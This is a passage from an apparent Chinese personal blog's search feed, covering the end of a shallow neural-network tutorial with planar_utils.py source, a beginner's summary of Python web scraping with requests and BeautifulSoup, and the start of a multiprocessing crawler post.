class="token punctuation">,</span> X<span class="token punctuation">)</span><span class="token punctuation">:</span>      A2<span class="token punctuation">,</span> cache <span class="token operator">=</span> forward_propagation<span class="token punctuation">(</span>X<span class="token punctuation">,</span> parameters<span class="token punctuation">)</span>      predictions <span class="token operator">=</span> np<span class="token punctuation">.</span>round<span class="token punctuation">(</span>A2<span class="token punctuation">)</span>      <span class="token keyword">return</span> predictions  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="模型预测"><a href="#模型预测" class="headerlink" title="模型预测"></a>模型预测</h2><pre class="line-numbers language-python"><code class="language-python">parameters <span class="token operator">=</span> nn_model<span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> n_h <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">,</span> num_iterations<span class="token operator">=</span><span class="token number">10000</span><span class="token punctuation">,</span> print_cost<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#plot_decision_boundary(lambda x: predict(parameters, x.T), X, Y)  </span>plot_decision_boundary<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> predict<span class="token punctuation">(</span>parameters<span class="token punctuation">,</span> x<span class="token punctuation">.</span>T<span class="token punctuation">)</span><span class="token punctuation">,</span> X<span class="token punctuation">,</span> np<span class="token punctuation">.</span>squeeze<span class="token punctuation">(</span>Y<span class="token punctuation">)</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Decison Boundary for hidden layer size"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  predictions <span class="token operator">=</span> predict<span class="token punctuation">(</span>parameters<span class="token punctuation">,</span> X<span class="token punctuation">)</span>  <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'准确率: %d'</span> <span class="token operator">%</span> float<span class="token punctuation">(</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>Y<span class="token punctuation">,</span> predictions<span class="token punctuation">.</span>T<span class="token punctuation">)</span> <span class="token operator">+</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> Y<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">-</span> predictions<span class="token punctuation">.</span>T<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> float<span class="token punctuation">(</span>Y<span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%'</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>第0次循环， 成本为：0.6930480201239823  第1000次循环， 成本为：0.3098018601352803  第2000次循环， 成本为：0.2924326333792646  第3000次循环， 成本为：0.2833492852647412  第4000次循环， 成本为：0.27678077562979253  第5000次循环， 成本为：0.26347155088593144  第6000次循环， 成本为：0.24204413129940763  第7000次循环， 成本为：0.23552486626608762  第8000次循环， 成本为：0.23140964509854278  第9000次循环， 成本为：0.22846408048352365  准确率: 90%  </code></pre><p><img src="http://sowcar.com/t6/689/1553529187x2728265488.png" alt="png">  </p><pre class="line-numbers language-python"><code class="language-python">plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  hidden_layer_sizes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#隐藏层数量  </span><span class="token keyword">for</span> i<span class="token punctuation">,</span> n_h <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>hidden_layer_sizes<span class="token punctuation">)</span><span class="token punctuation">:</span>      plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>      plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'Hidden Layer of size %d'</span> <span class="token operator">%</span> n_h<span class="token punctuation">)</span>      parameters <span class="token operator">=</span> nn_model<span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> n_h<span class="token punctuation">,</span> num_iterations<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>      plot_decision_boundary<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> predict<span class="token punctuation">(</span>parameters<span class="token punctuation">,</span> x<span class="token punctuation">.</span>T<span class="token punctuation">)</span><span class="token punctuation">,</span> X<span class="token punctuation">,</span> np<span class="token punctuation">.</span>squeeze<span class="token punctuation">(</span>Y<span class="token punctuation">)</span><span class="token punctuation">)</span>      predictions <span class="token operator">=</span> predict<span class="token punctuation">(</span>parameters<span class="token punctuation">,</span> X<span class="token punctuation">)</span>      accuracy <span class="token operator">=</span> float<span class="token punctuation">(</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>Y<span class="token punctuation">,</span> predictions<span class="token punctuation">.</span>T<span class="token punctuation">)</span> <span class="token operator">+</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> Y<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">-</span> predictions<span class="token punctuation">.</span>T<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> float<span class="token punctuation">(</span>Y<span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"隐藏层的节点数量： {}  ，准确率: {} %"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>n_h<span class="token punctuation">,</span> accuracy<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>隐藏层的节点数量： 1  ，准确率: 67.25 %  隐藏层的节点数量： 2  ，准确率: 66.5 %  隐藏层的节点数量： 3  ，准确率: 89.25 %  隐藏层的节点数量： 4  ，准确率: 90.0 %  隐藏层的节点数量： 5  ，准确率: 89.75 %  隐藏层的节点数量： 20  ，准确率: 90.0 %  隐藏层的节点数量： 50  ，准确率: 89.75 %  </code></pre><p><img src="http://sowcar.com/t6/689/1553529213x2728265488.png" alt="png">  </p><h2 id="planar-utils-py文件源码解析"><a href="#planar-utils-py文件源码解析" class="headerlink" title="planar_utils.py文件源码解析"></a>planar_utils.py文件源码<a href="https://sophia0130.github.io/2018/06/25/Deep-Learning-%E5%90%B4%E6%81%A9%E8%BE%BE-%E4%BD%9C%E4%B8%9A%E2%80%94%E2%80%94%E5%85%B3%E4%BA%8Eplot-decision-boundary-%E5%87%BD%E6%95%B0%E7%9A%84%E7%90%86%E8%A7%A3/" target="_blank" rel="noopener">解析</a></h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  <span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">import</span> sklearn  <span class="token keyword">import</span> sklearn<span class="token punctuation">.</span>datasets  <span class="token keyword">import</span> sklearn<span class="token punctuation">.</span>linear_model  <span class="token keyword">def</span> <span class="token function">plot_decision_boundary</span><span class="token punctuation">(</span>model<span class="token punctuation">,</span> X<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment" spellcheck="true"># Set min and max values and give it some padding  </span>    x_min<span class="token punctuation">,</span> x_max <span class="token operator">=</span> X<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>min<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> X<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>max<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>      y_min<span class="token punctuation">,</span> y_max <span class="token operator">=</span> X<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>min<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> X<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>max<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>      h <span class="token operator">=</span> <span class="token number">0.01</span>      <span class="token comment" spellcheck="true"># Generate a grid of points with distance h between them  </span>    xx<span class="token punctuation">,</span> yy <span class="token operator">=</span> np<span class="token punctuation">.</span>meshgrid<span class="token punctuation">(</span>np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span>x_min<span class="token punctuation">,</span> x_max<span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span>y_min<span class="token punctuation">,</span> y_max<span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># Predict the function value for the whole grid  </span>    Z <span class="token operator">=</span> model<span class="token punctuation">(</span>np<span class="token punctuation">.</span>c_<span class="token punctuation">[</span>xx<span class="token punctuation">.</span>ravel<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> yy<span class="token punctuation">.</span>ravel<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      Z <span class="token operator">=</span> Z<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span>xx<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># Plot the contour and training examples  </span>    plt<span class="token punctuation">.</span>contourf<span class="token punctuation">(</span>xx<span class="token punctuation">,</span> yy<span class="token punctuation">,</span> Z<span class="token punctuation">,</span> cmap<span class="token operator">=</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>Spectral<span class="token punctuation">)</span>      plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'x2'</span><span class="token punctuation">)</span>      plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'x1'</span><span class="token punctuation">)</span>      plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>X<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> X<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c<span class="token operator">=</span>y<span class="token punctuation">,</span> cmap<span class="token operator">=</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>Spectral<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">sigmoid</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>      s <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> s  <span class="token keyword">def</span> <span class="token function">load_planar_dataset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>      m <span class="token operator">=</span> <span class="token number">400</span> <span class="token comment" spellcheck="true"># number of examples  </span>    N <span class="token operator">=</span> int<span class="token punctuation">(</span>m<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># number of points per class  </span>    D <span class="token operator">=</span> <span class="token number">2</span> <span class="token comment" spellcheck="true"># dimensionality  </span>    X <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>D<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># data matrix where each row is a single example  </span>    Y <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span><span class="token string">'uint8'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># labels vector (0 for red, 1 for blue)  </span>    a <span class="token operator">=</span> <span class="token number">4</span> <span class="token comment" spellcheck="true"># maximum ray of the flower  </span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          ix <span class="token operator">=</span> range<span class="token punctuation">(</span>N<span class="token operator">*</span>j<span class="token punctuation">,</span>N<span class="token operator">*</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          t <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span>j<span class="token operator">*</span><span class="token number">3.12</span><span class="token punctuation">,</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3.12</span><span class="token punctuation">,</span>N<span class="token punctuation">)</span> <span class="token operator">+</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.2</span> <span class="token comment" spellcheck="true"># theta  </span>        r <span class="token operator">=</span> a<span class="token operator">*</span>np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span>t<span class="token punctuation">)</span> <span class="token operator">+</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.2</span> <span class="token comment" spellcheck="true"># radius  </span>        X<span class="token punctuation">[</span>ix<span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>c_<span class="token punctuation">[</span>r<span class="token operator">*</span>np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span> r<span class="token operator">*</span>np<span class="token punctuation">.</span>cos<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">]</span>          Y<span class="token punctuation">[</span>ix<span class="token punctuation">]</span> <span class="token operator">=</span> j      X <span class="token operator">=</span> X<span class="token punctuation">.</span>T      Y <span class="token operator">=</span> Y<span class="token punctuation">.</span>T      <span class="token keyword">return</span> X<span class="token punctuation">,</span> Y  <span class="token keyword">def</span> <span class="token function">load_extra_datasets</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        N <span class="token operator">=</span> <span class="token number">200</span>      noisy_circles <span class="token operator">=</span> sklearn<span class="token punctuation">.</span>datasets<span class="token punctuation">.</span>make_circles<span class="token punctuation">(</span>n_samples<span class="token operator">=</span>N<span class="token punctuation">,</span> factor<span class="token operator">=</span><span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">,</span> noise<span class="token operator">=</span><span class="token punctuation">.</span><span class="token number">3</span><span class="token punctuation">)</span>      noisy_moons <span class="token operator">=</span> sklearn<span class="token punctuation">.</span>datasets<span class="token punctuation">.</span>make_moons<span class="token punctuation">(</span>n_samples<span class="token operator">=</span>N<span class="token punctuation">,</span> noise<span class="token operator">=</span><span class="token punctuation">.</span><span class="token number">2</span><span class="token punctuation">)</span>      blobs <span class="token operator">=</span> sklearn<span class="token punctuation">.</span>datasets<span class="token punctuation">.</span>make_blobs<span class="token punctuation">(</span>n_samples<span class="token operator">=</span>N<span class="token punctuation">,</span> random_state<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> n_features<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> centers<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span>      gaussian_quantiles <span class="token operator">=</span> sklearn<span class="token punctuation">.</span>datasets<span class="token punctuation">.</span>make_gaussian_quantiles<span class="token punctuation">(</span>mean<span class="token operator">=</span>None<span class="token punctuation">,</span> cov<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span> n_samples<span class="token operator">=</span>N<span class="token punctuation">,</span> n_features<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> n_classes<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> shuffle<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> random_state<span class="token operator">=</span>None<span class="token punctuation">)</span>      no_structure <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span>N<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span>N<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> noisy_circles<span class="token punctuation">,</span> noisy_moons<span class="token punctuation">,</span> blobs<span class="token punctuation">,</span> gaussian_quantiles<span class="token punctuation">,</span> no_structure  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 吴恩达深度学习笔记 </tag>
            
            <tag> 神经网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单爬虫总结</title>
      <link href="/2019/03/22/2019-pa-chong-zong-jie/"/>
      <url>/2019/03/22/2019-pa-chong-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="简单爬虫总结"><a href="#简单爬虫总结" class="headerlink" title="简单爬虫总结"></a>简单爬虫总结</h1><h2 id="网页加载"><a href="#网页加载" class="headerlink" title="网页加载"></a>网页加载</h2><h3 id="加载方法"><a href="#加载方法" class="headerlink" title="加载方法"></a>加载方法</h3><ul><li>urlopen  <ul><li><code>from urllib.request import urlopen</code>  </li><li><code>html = urlopen(&#39;网址&#39;).read().decode(&#39;utf-8&#39;)</code>  </li><li><code>#返回的是网页的源码，字符串</code>  </li></ul></li><li>requests  <ul><li><code>import requests</code>  </li><li><code>html = requests.get(&#39;网址&#39;)#返回的是requests的对象</code>  </li><li><code>html.text #可以得到文字</code>   </li></ul></li></ul><h3 id="浏览器伪装"><a href="#浏览器伪装" class="headerlink" title="浏览器伪装"></a>浏览器伪装</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests  headers <span class="token operator">=</span> <span class="token punctuation">{</span>      <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763"</span>  <span class="token punctuation">}</span>  html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'网址'</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="网页解析"><a href="#网页解析" class="headerlink" title="网页解析"></a>网页解析</h2><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><ul><li><code>import re</code>  </li><li><code>re.findall(r&#39;条件&#39;, html)</code>  </li><li><code>#返回搜索结果构成的列表</code>  </li><li><em><a href="https://ainiya.xyz/2019/02/19/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">详见</a></em>  </li></ul><h3 id="BeautifulSoup模块"><a href="#BeautifulSoup模块" class="headerlink" title="BeautifulSoup模块"></a>BeautifulSoup模块</h3><ul><li><p><code>from bs4 import BeautifulSoup</code>  </p></li><li><p><code>soup = BeautifulSoup(html, features=&#39;lxml&#39;)</code> #构建对象,选取解析方式  </p></li><li><p>点域访问  </p><ul><li>soup + ‘.’ + 标签(head, h1, p….)  </li></ul></li><li><p>find_all <em>只能对一个元素进行查找</em>  </p><ul><li>find_all(‘标签’) #返回所有标签构成的列表  </li><li>对于每个标签内部可以使用类似字典的方式访问每个关键字描述  <pre class="line-numbers language-python"><code class="language-python"> all_href <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> all_href<span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>高级find_all  </p><ul><li><p><code>month = soup.find_all(&#39;标签&#39;, {&#39;关键子&#39;:&#39;描述&#39;,....})</code>   </p><ul><li><p>只要关键字描述中识别到了描述条件便符合匹配,返回构成的列表,<em>如</em>:  </p><pre class="line-numbers language-python"><code class="language-python">  month <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'class'</span><span class="token punctuation">:</span><span class="token string">'month'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>month<span class="token punctuation">)</span>    <span class="token punctuation">[</span><span class="token operator">&lt;</span>li <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"month"</span><span class="token operator">></span>一月<span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span>li <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"feb month"</span><span class="token operator">></span>二月<span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span>li <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"month"</span><span class="token operator">></span>三月<span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span>li <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"month"</span><span class="token operator">></span>四月<span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span>li <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"month"</span><span class="token operator">></span>五月<span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token punctuation">]</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>描述使用正则表达式  </p><ul><li>对条件格式化 <code>re.compile(&#39;正则条件&#39;)</code>  </li></ul></li></ul></li></ul><h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> os  os<span class="token punctuation">.</span>markdirs<span class="token punctuation">(</span><span class="token string">'路径文件夹'</span><span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 建立路径,如果已经存在则直接访问  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul><li><p>urlretrieve  </p><pre class="line-numbers language-python"><code class="language-python">  <span class="token keyword">from</span> rullib<span class="token punctuation">.</span>request <span class="token keyword">import</span> rulretrieve    url    urlretrieve<span class="token punctuation">(</span>IMAGE_RUL<span class="token punctuation">,</span> <span class="token string">'路径与文件名'</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>requests  </p><pre class="line-numbers language-python"><code class="language-python">  <span class="token keyword">import</span> requests    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>IMAGE_RUL<span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'路径与文件名'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># whole document  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>大文将处理(边下边存)  </p><pre class="line-numbers language-python"><code class="language-python">  r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>IMAGE_RUL<span class="token punctuation">,</span> stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># stream loading  </span>  <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"路径与文件名"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> chunk <span class="token keyword">in</span> r<span class="token punctuation">.</span>iter_content<span class="token punctuation">(</span>chunk_size<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <em>练习下载美图</em><a href="https://github.com/newlzs/python_tools/tree/master/爬虫" target="_blank" rel="noopener">源码</a>  </p></li></ul><h2 id="加速爬虫"><a href="#加速爬虫" class="headerlink" title="加速爬虫"></a>加速爬虫</h2><p>  <a href="https://ainiya.xyz/2019/03/22/%E5%8A%A0%E9%80%9F%E7%88%AC%E8%99%AB/">传送门</a>  </p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加速爬虫-分布，多进程</title>
      <link href="/2019/03/22/2019-jia-su-pa-chong/"/>
      <url>/2019/03/22/2019-jia-su-pa-chong/</url>
      
        <content type="html"><![CDATA[<h1 id="加速爬虫"><a href="#加速爬虫" class="headerlink" title="加速爬虫"></a>加速爬虫</h1><h2 id="多进程分布式"><a href="#多进程分布式" class="headerlink" title="多进程分布式"></a>多进程分布式</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> multiprocessing <span class="token keyword">as</span> mp  <span class="token keyword">import</span> time  <span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> urlopen<span class="token punctuation">,</span> urljoin  <span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup  <span class="token keyword">import</span> re  base_url <span class="token operator">=</span> <span class="token string">"https://morvanzhou.github.io/"</span>  restricted_crawl <span class="token operator">=</span> <span class="token boolean">False</span> <span class="token comment" spellcheck="true"># 爬取限制取消  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">crawl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#加载网页  </span>    response <span class="token operator">=</span> urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">#time.sleep(0.1) # 主动添加反应延迟（网速慢时可不添加）  </span>    <span class="token keyword">return</span> response<span class="token 